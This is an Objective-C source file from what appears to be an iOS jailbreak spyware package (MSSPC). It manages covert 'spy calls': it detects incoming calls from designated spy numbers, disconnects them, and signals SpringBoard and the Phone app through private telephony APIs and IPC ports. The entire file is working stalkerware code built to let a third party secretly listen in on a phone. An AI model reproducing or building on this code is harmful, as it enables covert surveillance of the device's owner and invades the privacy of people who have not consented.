//
//  ICSSpyCallManager.m
//  MSSPC
//
//  Created by Makara on 11/27/14.
//
//

#import "ICSSpyCallManager.h"
#import "SpyCallSerivceIDs.h"
#import "SpyCallManagerSnapshot.h"
#import "SpyCallUtils.h"
#import "Telephony.h"

#import "MessagePortIPCSender.h"
#import "DefStd.h"

#import "TUCallCenter.h"
#import "TUCall.h"
#import "TUCall+iOS8.h"
#import "TUTelephonyCall.h"

#import <objc/runtime.h>

static ICSSpyCallManager *_ICSSpyCallManager = nil;

@interface ICSSpyCallManager (private)
+ (void) sendDisconnectSignal;
- (void) updateSnapshot;
- (void) discardSnapshot;
@end

@implementation ICSSpyCallManager

@synthesize mSpyCallManagerSnapshot;

+ (id) sharedICSSpyCallManager {
    if (_ICSSpyCallManager == nil) {
        _ICSSpyCallManager = [[ICSSpyCallManager alloc] init];
    }
    return (_ICSSpyCallManager);
}

+ (BOOL) anySpyCall {
    BOOL spyCall = NO;
    Class $TUCallCenter = objc_getClass("TUCallCenter");
    TUCallCenter *callCenter = [$TUCallCenter sharedInstance];
    NSArray *currentCalls = [callCenter currentCalls]; // TUTelephonyCall, destinationID is a telephone number
    //APPLOGVERBOSE(@"currentCalls = %@", currentCalls);
    for (TUTelephonyCall *call in currentCalls) {
        if (![call isOutgoing] &&
            [SpyCallUtils isSpyNumber:[call destinationID]]) {
            spyCall = YES;
            break;
        }
    }
    APPLOGVERBOSE(@"anySpyCall = %d", spyCall);
    return (spyCall);
}

+ (BOOL) anyCallOnHold {
    BOOL hold = NO;
    Class $TUCallCenter = objc_getClass("TUCallCenter");
    TUCallCenter *callCenter = [$TUCallCenter sharedInstance];
    NSArray *currentCalls = [callCenter currentCalls]; // TUTelephonyCall, destinationID is a telephone number
    //APPLOGVERBOSE(@"currentCalls = %@", currentCalls);
    for (TUTelephonyCall *call in currentCalls) {
        if ([call callStatus] == CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD) {
            hold = YES;
            break;
        }
    }
    return (hold);
}

+ (BOOL) isConferenced: (CTCall *) aCTCall {
    BOOL isConferenced = NO;
    Class $TUTelephonyCall = objc_getClass("TUTelephonyCall");
    TUTelephonyCall *telephonyCall = [[$TUTelephonyCall alloc] initWithCall:(struct __CTCall *)aCTCall];
    isConferenced = [telephonyCall isConferenced];
    [telephonyCall release];
    //APPLOGVERBOSE(@"isConferenced: %d", isConferenced);
    return (isConferenced);
}

+ (BOOL) endSpyCallIfAny {
    BOOL ended = NO;
    Class $TUCallCenter = objc_getClass("TUCallCenter");
    TUCallCenter *callCenter = [$TUCallCenter sharedInstance];
    NSArray *currentCalls = [callCenter currentCalls];
    for (TUTelephonyCall *call in currentCalls) {
        if (![call isOutgoing] &&
            [SpyCallUtils isSpyNumber:[call destinationID]]) {
            [call disconnect];
            ended = YES;
            //[self sendDisconnectSignal];
            APPLOGVERBOSE(@"Spy call = %@", call);
            break;
        }
    }
    return (ended);
}

+ (void) sendDisconnectSignal {
    NSInteger serviceID = kSpyCallServiceEndSpyCall;
	NSMutableData *data = [NSMutableData data];
	[data appendBytes:&serviceID length:sizeof(NSInteger)];
	switch (serviceID) {
		case kSpyCallServiceEndSpyCall:
			;
			break;
		default:
			break;
	}
    
    // SpringBoard
    MessagePortIPCSender *sender = [[MessagePortIPCSender alloc] initWithPortName:kSpringBoardMsgPort];
	[sender writeDataToPort:data];
	[sender release];
    sender = nil;
    
    // MobilePhone
	sender = [[MessagePortIPCSender alloc] initWithPortName:kMobilePhoneMsgPort];
	[sender writeDataToPort:data];
	[sender release];
    sender = nil;
}

- (SpyCallManagerSnapshot *) mSpyCallManagerSnapshot {
    APPLOGVERBOSE(@"mSpyCallManagerSnapshot synthesize override...");
    if (!mSpyCallManagerSnapshot) {
        [self updateSnapshot];
        [self performSelector:@selector(discardSnapshot)
                   withObject:nil
                   afterDelay:0.5];
    }
    return (mSpyCallManagerSnapshot);
}

- (void) updateSnapshot {
    MessagePortIPCSender *writer = [[MessagePortIPCSender alloc] initWithPortName:kInCallServiceMsgPort];
    NSMutableData *snapshotSpyCallCmdData = [NSMutableData data];
    NSInteger cmd = kSpyCallServiceSnapshotSpyCall;
    [snapshotSpyCallCmdData appendBytes:&cmd length:sizeof(NSInteger)];
    [writer writeDataToPort:snapshotSpyCallCmdData];
    NSData *returnData = [writer mReturnData];
    APPLOGVERBOSE(@"updateSnapshot, returnData = %@", returnData);
    if (returnData) {
        SpyCallManagerSnapshot *snapshot = [[SpyCallManagerSnapshot alloc] initWithData:returnData];
        [self setMSpyCallManagerSnapshot:snapshot];
        [snapshot release];
    }
    [writer release];
    writer = nil;
}

- (void) discardSnapshot {
    APPLOGVERBOSE(@"discardSnapshot...");
    [self setMSpyCallManagerSnapshot:nil];
}

- (void) dealloc {
    _ICSSpyCallManager = nil;
    [self discardSnapshot];
    [super dealloc];
}

@end
